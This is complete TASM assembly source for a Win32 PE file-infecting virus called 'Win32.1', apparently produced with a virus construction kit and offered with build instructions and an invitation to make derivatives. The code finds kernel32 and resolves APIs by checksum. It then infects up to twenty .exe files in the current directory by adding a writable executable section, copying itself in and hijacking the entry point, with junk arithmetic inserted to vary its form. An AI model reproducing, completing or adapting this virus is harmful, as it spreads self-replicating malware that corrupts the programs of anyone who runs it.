              
;
;
; Win32.1 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.1
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 1
;  Infection Type         : adding a new section 
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 34
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop ebx

                                        ; load API Names and Offsets
 mov edi, ebp
 add edi, offset APIOffsets

 lea edx, [ebp+APINames]
 xchg edx, eax


GetApisLoop: 

                                        ; search 'em
                                        ; eax points to the CRC
                                        ; edi points to the offset
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

 call SearchAPI1
                                        ; add eax, 4
 add eax, 4d
                                        ; clear ecx
 mov ecx, -14904d
 add ecx, 14904d
 add ecx, dword ptr [ebp+TempAPI]
 mov dword ptr [edi], ecx
                                        ; add edi, 4
 inc edi
 add edi, 3d
 sub ebx, 1
 jnz GetApisLoop
 jmp Outbreak



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; clear ecx
 and ecx, 0
 add ecx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, ecx
 add esi, [ecx+3Ch]
                                        ; get File Alignment
                                        ; add esi, 60
 add esi, 60d
 mov ecx, [esi]
                                        ; mov ebx, 60
 mov ebx, ( 60d + 32d )
 sub ebx, 32d
 sub esi, ebx
 mov dword ptr [ebp+filealign], -1
 and dword ptr [ebp+filealign], ecx
                                        ; clear esi
 sub esi, esi
 xor esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov eax, esi
 sbb ebx, 23d                           ; Trash
 add eax, dword ptr [esi+3Ch]
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], -1
 and dword ptr [ebp+PEheader], eax
                                        ; get old Entrypoint
 mov ecx, dword ptr [eax+34h]
 push ecx
 pop dword ptr [ebp+OldBase]
 mov edx, dword ptr [eax+28h]
 mov dword ptr [ebp+OldEIP], 0
 xor dword ptr [ebp+OldEIP], edx
 mov ecx, [eax+38h]
 mov dword ptr [ebp+sectionalign], ecx
 sbb edx, 3d                            ; Trash
                                        ; Get last section
 mov ecx, [eax+74h]
 shl ecx, 3
                                        ; clear ebx
 sub ebx, ebx
 mov bx, word ptr [eax+6h]
 mov edx, 28h
 pushad
 mov eax, ebx
 mul edx
 push eax
 pop dword ptr [ebp+Misc1]
 popad
                                        ; clear ebx
 mov ebx, 52961d
 sub ebx, 52961d
 xor ebx, dword ptr [ebp+Misc1]
 add eax, 78h
 add eax, ecx
 add eax, ebx
 lea edx, [ebp+newsection]
 xchg ecx, edx


 xchg ecx, eax
 push ecx
                                        ; Calculate the RVA of the new section
 mov edx, [ecx-5*8+8d]
 add edx, [ecx-5*8+12d]
 mov eax, dword ptr [ebp + offset sectionalign]
 push edx
 pop dword ptr [ebp+AlignReg1]
 push eax
 pop dword ptr [ebp+AlignReg2]
 push edx
 pop dword ptr [ebp+nsphysicalsize]
 Call Align
                                        ; clear ebx
 mov ebx, 0
 xor ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], ebx
                                        ;  calculate the virtual size of the new section
 mov eax, dword ptr [ebp + offset sectionalign]
 push VirusSize
 pop dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], eax
 Call Align
                                        ; clear edx
 mov edx, -38656d
 add edx, 38656d
 xor edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], edx
                                        ; calculate physical offset
 mov eax,[ecx-5*8+20d]
 add eax,[ecx-5*8+16d]
 mov ebx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], eax
 push ebx
 pop dword ptr [ebp+AlignReg2]
 Call Align
                                        ; clear ecx
 mov ecx, -13965d
 add ecx, 13965d
 add ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], ecx
                                        ; calculate new size
                                        ; clear eax
 mov eax, -33072d
 add eax, 33072d
 add eax, dword ptr [ebp+filealign]
 mov edx, ecx
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], eax
 add edx, VirusSize
 push edx
 pop dword ptr [ebp+AlignReg1]
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 add dword ptr [ebp+NewSize], edx
 pushad
 Call UnMapFile2
 popad
 push edx
 pop dword ptr [ebp+WFD_nFileSizeLow]
 call CreateMap
 jc NoEXE
 mov ecx, ecx                           ; Trash
 lea edx, [ebp+newsection]
 xchg eax, edx

                                        ; mov ebx, 64
 mov ebx, 0
 add ebx, 64d
 pop esi
WriteNewSectionLoop:
 mov cl, byte ptr [eax]
 mov byte ptr [esi], cl
                                        ; add esi, 1
 add esi, 1d
 sub ebx, 1
                                        ; add eax, 1
 sub eax, -1d
 cmp ebx, 0
 jne WriteNewSectionLoop
                                        ; increase section numbers
                                        ; mov ebx, -1
 mov ebx, ( -1d xor 14d )
 xor ebx, 14d
 and ebx, dword ptr [ebp+PEheader]
 inc word ptr [ebx+06h]
 mov ecx, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], -1
 and dword ptr [ebp+NewEIP], ecx
                                        ; set new EIP
 mov dword ptr  [ebx+28h], ecx
                                        ; set infection mark
 mov dword ptr [ebx+4Ch], -1d
 and dword ptr [ebx+4Ch], '1'
                                        ; clear eax
 mov eax, 0
 add eax, dword ptr [ebp+nsphysicaloffset]
 push eax
                                        ; Append Virus
 pop edi
 mov ecx, VirusSize
 lea esi, [ebp+Virus]

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 rep movsb
                                        ; decrease Infection Counter
                                        ; clear edx
 mov edx, 31081d
 sub edx, 31081d
 xor edx, dword ptr [ebp+InfCounter]
 sub edx, 1
 mov dword ptr [ebp+InfCounter], 0
 xor dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 pop eax
 stc
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov edi, ebp
 add edi, offset WIN32_FIND_DATA

 push edi
 push ecx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 add dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 mov eax, ebp
 add eax, offset WFD_szFileName

                                        ; mov ecx, 276
 mov ecx, ( 276d - 38d )
 add ecx, 38d

ClearOldData2:
 mov byte ptr [eax], 0h
                                        ; add eax, 1
 sub eax, -1d
 dec ecx
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea eax, [ebp+WIN32_FIND_DATA]

 push eax
                                        ; mov ecx, -1
 mov ecx, ( -1d - 4d )
 add ecx, 4d
 and ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret





;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for maximum filesize
 lea edi, [ebp+WFD_nFileSizeHigh]
 xchg ebx, edi

 cmp dword ptr [ebx], 0
 jne NoInfection
                                        ; get and remove file attributes
 lea esi, [ebp+WFD_szFileName]
 xchg ecx, esi

 push ecx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov edx, 128
 mov edx, ( 128d xor 11d )
 xor edx, 11d
 push edx
 lea eax, [ebp+WFD_szFileName]


 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 add ebx, 25269266d                     ; Trash
                                        ; add eax, 1
 sub eax, -1d
 dec eax
 jz NoInfection
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear eax
 and eax, 0
 xor eax, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx edx, word ptr [eax]
 xor edx, 'ZM'
 jz Goodfile
                                        ; mov ebx, 50249
 mov ebx, ( 50249d xor 30d )
 xor ebx, 30d
 cmp ebx, 50249d
 je Notagoodfile

Goodfile:
 cmp word ptr [eax+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 push dword ptr [eax+3Ch]
 pop esi
                                        ; check if header lies inside the file
 cmp esi, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add esi, eax
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [esi], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [esi+4Ch], '1'
 jz Notagoodfile
                                        ; check for OBJ
 mov cx, word ptr [esi+16h]
 and cx, 00002h
 cmp cx, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 push dword ptr [ebp+Attributes]
 pop ebx
 push ebx
 lea ebx, [ebp+WFD_szFileName]
 xchg edx, ebx

 push edx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 mov edx, -26089d
 add edx, 26089d
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
 push eax
 div ebx
 sub ebx, edx
 pop eax
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 mov dword ptr [ebp+Trash1], ecx        ; Trash
 push 1
 mov edx, 80000000h or 40000000h
 push edx
 lea ecx, [ebp+WFD_szFileName]
 xchg ecx, esi

 push esi
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 sub eax, 1
 rol ecx, 21d                           ; Trash

 push eax
 pop dword ptr [ebp+FileHandle]

CreateMap:                              ; Map the file
                                        ; clear edx
 mov edx, 36582d
 sub edx, 36582d
 xor edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx
 push 0
 push edx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 push eax
 pop dword ptr [ebp+MapHandle]
 pop edx
 test eax, eax
 jz CloseFile
                                        ; clear eax
 mov eax, 0
 push edx
 push eax
 push eax
                                        ; mov ebx, 2
 mov ebx, 0
 add ebx, 2d
 push ebx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
                                        ; add eax, 1
 add eax, 1d
 sub eax, 1
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 xor dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; mov edi, -1
 mov edi, 0
 add edi, -1d
 and edi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edi

                                        ; clear ebx
 mov ebx, -46969d
 add ebx, 46969d
 add ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], ebx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retBase dd 0h
 add edx,12345678h
 org $-4
 retEIP dd 0h
 jmp edx



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



                                        ; clear ecx
 mov ecx, 15947d
 sub ecx, 15947d
 add ecx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear esi
 push 0
 pop esi
 add esi, [ecx+78h]
 add esi, [ebp+KernelMZ]
                                        ; add esi, 28
 inc esi
 add esi, 27d
                                        ; get ATableVA
 mov ecx, dword ptr [esi]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ecx
                                        ; add esi, 4
 inc esi
 add esi, 3d
                                        ; get NTableVA
 mov ecx, dword ptr [esi]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ecx
                                        ; add esi, 4
 inc esi
 add esi, 3d
                                        ; get OTableVA
 mov ecx, dword ptr [esi]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ecx
 mov edx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push edx
                                        ; mov ebx, -1
 push -1d
 pop ebx
 and ebx, dword ptr [ebp+KernelMZ]
 add ebx, dword ptr [edx]
                                        ; mov edx, ebx
 push ebx
 pop edx
                                        ; mov edi, edx
                                        ; clear edi
 and edi, 0
 add edi, edx
 push edi
 push eax
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; eax Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
 push dword ptr [eax]
 pop ebx
 LoopChsksm:
                                        ; clear ecx
 and ecx, 0
 mov cl, byte ptr [edi]
                                        ; add edi, 1
 sub edi, -1d
 shl cx,8d
 sub ebx, ecx
 cmp cx, 0
 je LoopConti
                                        ; clear ecx
 mov ecx, 0
 mov cl, byte ptr [edi]
 sub ebx, ecx
                                        ; add edi, 1
 add edi, 1d
 or cx, cx
 jnz LoopChsksm
LoopConti:
 or ebx, ebx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop eax
 pop edi
 pop edx
                                        ; add edx, 4
 inc edx
 add edx, 3d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2002h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 12d
                                        ; retrieve the offset
 movzx edx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 mov edi, edx
                                        ; clear edx
 mov edx, 0
 mov dx, word ptr [edi]
 clc
 rcl edx, 2h
 add edx, dword ptr [ebp+ATableVA]
 rcl ecx, 26d                           ; Trash
                                        ; convert to RVA
                                        ; mov ecx, -1
 mov ecx, 0
 add ecx, -1d
 and ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [edx]
 mov dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ecx
 popad
 jmp ExecuteHost



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop eax
 sub esp, 4d
 neg edx                                ; Trash
                                        ; round to pages
 ror eax, 16d
 shl eax, 16d
                                        ; add eax, 1
 sub eax, -1d
GetKernelLoop:
                                        ; clear ecx
 mov ecx, -31242d
 add ecx, 31242d
 add eax, -1
 mov cx, word ptr [eax+03ch]
 cmp cx,0f800h
 je GetKernelLoop
 cmp eax, dword ptr [eax+ecx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], 0
 add dword ptr [ebp+KernelMZ], eax
                                        ; add eax, 60
 add eax, 60d
 mov edx, [eax]
 sub eax, 60d
 add edx, eax
 mov [KernelPE+ebp], edx

 jmp GetApis

;                  [ ///// * Data * \\\\\ ]

Data:
 counter     dw 0h
 sectionalign   dd 0h
 Trash1      dd 0h
 FindHandle  dd 0h
 PEheader    dd 0h
 Attributes  dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 OldEIP      dd 0h
 OldBase     dd 400000h

 APINames:
 dd 'Ge'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Se'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h

 InfCounter  dd 0h
 NewEIP      dd 0h
 MapHandle   dd 0h

 APIOffsets:
 XGetFileAttributesA    dd 0h
 XCreateFileA           dd 0h
 XFindNextFileA         dd 0h
 XFindFirstFileA        dd 0h
 XUnmapViewOfFile       dd 0h
 XSetFileAttributesA    dd 0h
 XCloseHandle           dd 0h
 XFindClose             dd 0h
 XCreateFileMappingA    dd 0h
 XMapViewOfFile         dd 0h

 KernelMZ    dd 0h
 KernelPE    dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.NGVCKvx'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 MapAddress  dd 0h
 AlignReg1   dd 0h
 TempAPI     dd 0h

 FileHandle  dd 0h
 db 'Win32.1 - SnakeByte',0
 AlignReg2   dd 0h
 filealign   dd 0h
 Misc1       dd 0h
 NTableVA    dd 0h
 OTableVA    dd 0h
 filemask    db '*.eXE',0
 NewSize     dd 0h
 ATableVA    dd 0h




;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
                                        ; mov ebx, -1
 mov ebx, -1d
 and ebx, dword ptr [ebp+OldEIP]

 push ebx
 pop dword ptr [ebp+retEIP]

                                        ; clear eax
 sub eax, eax
 add eax, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], eax




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 push 20d
 pop dword ptr [ebp+InfCounter]
 mov ecx, offset filemask
 add ecx, ebp

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 add eax, 1d
 or eax, eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 pop ebx
 push ebx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

